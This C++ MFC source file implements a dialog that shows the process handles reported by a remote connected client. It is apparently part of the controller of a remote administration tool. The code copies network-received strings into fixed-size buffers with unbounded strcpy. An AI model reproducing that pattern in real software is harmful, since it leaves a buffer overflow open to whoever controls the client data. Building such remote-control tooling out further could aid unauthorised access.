// DlgHandleManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgHandleManager.h"
#include "afxdialogex.h"


// DlgHandleManager 对话框

IMPLEMENT_DYNAMIC(CDlgHandleManager, CDialog)


CDlgHandleManager::CDlgHandleManager(CWnd * pParent, _CIOCPServer * IOCPServer, CONTEXT_OBJECT * ContextObject) : CDialog(IDD_DIALOG_HADNLE_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

	m_BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0));
}

CDlgHandleManager::~CDlgHandleManager()
{

}

void CDlgHandleManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_HANDLE_MANAGER_SHOW, m_CListCtrl_Dialog_Handle_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgHandleManager, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// DlgHandleManager 消息处理程序


BOOL CDlgHandleManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 获得客户端IP SetWindowText

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\%s - 远程进程句柄管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);
	//设置对话框上的数据
	LOGFONT Logfont;
	CFont* v2 = m_CListCtrl_Dialog_Handle_Manager_Show.GetFont();
	v2->GetLogFont(&Logfont);

	m_CListCtrl_Dialog_Handle_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	switch (m_BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_ENUM_HANDLE_REPLY:
	{
		m_CListCtrl_Dialog_Handle_Manager_Show.InsertColumn(0, "HandleValue", LVCFMT_LEFT, 60);
		m_CListCtrl_Dialog_Handle_Manager_Show.InsertColumn(1, "Object", LVCFMT_LEFT, 150);
		m_CListCtrl_Dialog_Handle_Manager_Show.InsertColumn(2, "HandleName", LVCFMT_LEFT, 200);
		m_CListCtrl_Dialog_Handle_Manager_Show.InsertColumn(3, "HandleType", LVCFMT_LEFT, 120);
		ShowHandleList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0

		break;
	}
	default:
		break;
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CDlgHandleManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->DialogID = 0;
	m_ContextObject->DialogHandle = NULL;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}


void CDlgHandleManager::ShowHandleList()
{

	char *BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));
	
	ULONG_PTR* HandleValue=NULL;
	PVOID * Object = NULL;
	char HandleName[MAX_PATH] ;
	char HandleType[MAX_PATH] ;
	
	
	
	DWORD	Offset = 0;

	m_CListCtrl_Dialog_Handle_Manager_Show.DeleteAllItems();
	CString v1;
	int i;
	for (i = 0; Offset <m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1; i++)
	{
		ULONG_PTR* HandleValue = (ULONG_PTR*)(BufferData + Offset);
		Object = (PVOID *)(BufferData + Offset + sizeof(ULONG_PTR));
		strcpy(HandleName, (char*)(BufferData + Offset + sizeof(ULONG_PTR) + sizeof(PVOID)));
		strcpy(HandleType, (char*)(BufferData + Offset + sizeof(ULONG_PTR) + sizeof(PVOID) + strlen(HandleName) + 1));
		

		v1.Format("%5u", *HandleValue);
		m_CListCtrl_Dialog_Handle_Manager_Show.InsertItem(i, v1);
		v1.Format("0x%08X", *Object);
		m_CListCtrl_Dialog_Handle_Manager_Show.SetItemText(i, 1, v1);
		v1.Format("%s", HandleName);
		m_CListCtrl_Dialog_Handle_Manager_Show.SetItemText(i, 2, v1);
		v1.Format("%s", HandleType);
		m_CListCtrl_Dialog_Handle_Manager_Show.SetItemText(i, 3, v1);

		//跳过这个结构进入下一次循环
		Offset += sizeof(HANDLE) + sizeof(PVOID)+ strlen(HandleName)
			+ strlen(HandleType) + 2;
	}
}
